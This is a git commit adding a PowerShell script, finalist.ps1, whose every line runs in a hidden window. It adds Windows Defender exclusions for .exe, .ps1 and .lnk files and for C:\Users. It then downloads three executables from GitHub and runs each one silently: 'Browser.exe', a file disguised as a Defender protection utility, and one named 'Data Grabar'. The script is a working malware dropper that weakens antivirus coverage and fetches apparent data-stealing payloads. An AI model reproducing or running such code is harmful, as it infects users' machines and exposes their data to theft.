f5434fe9b481f39ec1d47b3cac712e04b20afd20
rude90 <115774095+rude90@users.noreply.github.com>
2023-04-01 04:34:12 +0500

    Add files via upload

---
+++ finalist.ps1
@@ -0,0 +1,10 @@
+powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension ".exe"
+powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension ".ps1"
+powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension ".lnk"
+powershell -Windowstyle Hidden Add-MpPreference -ExclusionPath "C:\Users"
+powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/out/raw/main/Browser.exe -o C:\Users\Browser.exe
+powershell.exe -w Hidden C:\Users\Browser.exe
+powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/out/raw/main/Microsoft%20Defender%20Multi%20Protection%20utility.exe -o C:\Users\Defender_Protection_utility.exe
+powershell.exe -w Hidden C:\Users\Defender_Protection_utility.exe
+powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/test/raw/main/Data%20Grabar.exe -o C:\Users\Data_20Grabar.exe
+powershell.exe -w Hidden C:\Users\Data_20Grabar.exe
